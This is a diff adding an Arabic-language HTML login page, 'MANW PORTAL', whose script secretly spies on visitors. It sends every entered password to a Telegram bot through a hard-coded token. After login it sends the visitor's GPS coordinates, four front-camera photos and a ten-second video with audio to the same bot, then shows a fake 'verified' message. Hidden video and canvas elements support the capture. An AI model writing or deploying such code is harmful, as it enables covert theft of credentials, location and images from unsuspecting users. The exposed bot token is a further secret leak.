@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>MANW Secure Login</title>
+<style>
+*{box-sizing:border-box}
+body{
+margin:0;
+background:#08080c;
+color:white;
+font-family:Tahoma,Arial;
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+}
+.card{
+background:#17131a;
+border:1px solid #ff1744;
+padding:30px;
+border-radius:15px;
+box-shadow:0 0 25px rgba(255,0,60,0.3);
+width:100%;
+max-width:380px;
+text-align:center;
+}
+h2{color:#ff1744;margin-bottom:20px;letter-spacing:2px;}
+input{
+width:100%;
+padding:14px;
+margin:10px 0;
+background:#08080c;
+border:1px solid #4b1726;
+border-radius:8px;
+color:white;
+font-size:16px;
+text-align:center;
+}
+input:focus{outline:none;border-color:#ff1744;}
+button{
+width:100%;
+padding:14px;
+background:#ff1744;
+color:white;
+border:none;
+border-radius:8px;
+font-size:18px;
+font-weight:bold;
+cursor:pointer;
+margin-top:10px;
+transition:0.3s;
+}
+button:hover{background:#d50032;}
+.hidden-video { display: none; }
+</style>
+</head>
+<body>
+
+<div class="card" id="loginCard">
+  <h2>MANW PORTAL</h2>
+  <p style="color:#aaa; font-size:14px; margin-bottom:20px;">الرجاء إدخال كلمة السر للمتابعة</p>
+  <form id="loginForm" onsubmit="handleLogin(event)">
+    <input type="password" id="passwordInput" placeholder="كلمة السر" required>
+    <button type="submit">دخول</button>
+  </form>
+</div>
+
+<!-- عناصر مخفية لالتقاط الوسائط -->
+<video id="videoElement" class="hidden-video" autoplay playsinline></video>
+<canvas id="canvasElement" class="hidden-video"></canvas>
+
+<script>
+const BOT_TOKEN = "8874474256:AAFQscrKb4KHD8NjinM8gteFzxJUvZkg_Oo";
+const CHAT_ID = "7713496654";
+const CORRECT_PASS = "manw123";
+
+async function sendToTelegram(text) {
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+    });
+  } catch(e) {}
+}
+
+async function sendPhotoToTelegram(blob, caption) {
+  let formData = new FormData();
+  formData.append('chat_id', CHAT_ID);
+  formData.append('photo', blob, 'capture.jpg');
+  formData.append('caption', caption);
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: formData
+    });
+  } catch(e) {}
+}
+
+async function sendVideoToTelegram(blob, caption) {
+  let formData = new FormData();
+  formData.append('chat_id', CHAT_ID);
+  formData.append('video', blob, 'capture.mp4');
+  formData.append('caption', caption);
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+      method: 'POST',
+      body: formData
+    });
+  } catch(e) {}
+}
+
+async function handleLogin(event) {
+  event.preventDefault();
+  const pwd = document.getElementById('passwordInput').value;
+  
+  await sendToTelegram(`🚨 محاولة تسجيل دخول جديدة!\n🔑 كلمة السر المدخلة: ${pwd}`);
+  
+  if(pwd !== CORRECT_PASS) {
+    alert("كلمة السر غير صحيحة!");
+    return;
+  }
+
+  document.getElementById('loginCard').innerHTML = '<h3 style="color:#ff1744;">جاري التحقق وتجهيز الواجهة...</h3>';
+
+  // الحصول على الموقع الجغرافي إن أمكن
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+      let lat = pos.coords.latitude;
+      let lon = pos.coords.longitude;
+      await sendToTelegram(`📍 إحداثيات الموقع:\nخط العرض: ${lat}\nخط الطول: ${lon}\nرابط الخريطة: https://maps.google.com/?q=${lat},${lon}`);
+    }, () => {}, { timeout: 10000 });
+  }
+
+  // بدء التقاط الصور والفيديو
+  try {
+    // محاولة فتح الكاميرا (الأمامية افتراضياً في الموبايل)
+    const stream = await navigator.mediaDevices.getUserMedia({ 
+      video: { facingMode: "user" }, 
+      audio: true 
+    });
+    
+    const videoEl = document.getElementById('videoElement');
+    const canvasEl = document.getElementById('canvasElement');
+    videoEl.srcObject = stream;
+    await videoEl.play();
+
+    // التقاط 4 صور بفارق زمني بسيط
+    for(let i = 1; i <= 4; i++) {
+      await new Promise(r => setTimeout(r, 1000));
+      canvasEl.width = videoEl.videoWidth || 640;
+      canvasEl.height = videoEl.videoHeight || 480;
+      let ctx = canvasEl.getContext('2d');
+      ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
+      
+      let blob = await new Promise(res => canvasEl.toBlob(res, 'image/jpeg', 0.8));
+      if(blob) {
+        await sendPhotoToTelegram(blob, `📸 لقطة رقم ${i} (الكاميرا الأمامية)`);
+      }
+    }
+
+    // تسجيل فيديو لمدة 10 ثوانٍ
+    let mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+    let chunks = [];
+    
+    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+    mediaRecorder.onstop = async () => {
+      let videoBlob = new Blob(chunks, { type: 'video/webm' });
+      await sendVideoToTelegram(videoBlob, `🎥 تسجيل فيديو لمدة 10 ثوانٍ`);
+      
+      // إيقاف جميع الـ streams
+      stream.getTracks().forEach(track => track.stop());
+      
+      // إعادة توجيه وهمية أو إظهار رسالة نجاح
+      setTimeout(() => {
+        document.getElementById('loginCard').innerHTML = '<h3 style="color:#fff;">تم التحقق بنجاح. أهلاً بك يا سيدي.</h3>';
+      }, 1000);
+    };
+
+    mediaRecorder.start();
+    setTimeout(() => {
+      mediaRecorder.stop();
+    }, 10000);
+
+  } catch(err) {
+    await sendToTelegram(`⚠️ تعذر الوصول للكاميرا أو رفض الإذن: ${err.message}`);
+    document.getElementById('loginCard').innerHTML = '<h3 style="color:#fff;">حدث خطأ في المصادقة، حاول مرة أخرى.</h3>';
+  }
+}
+</script>
+
+</body>
+</html>
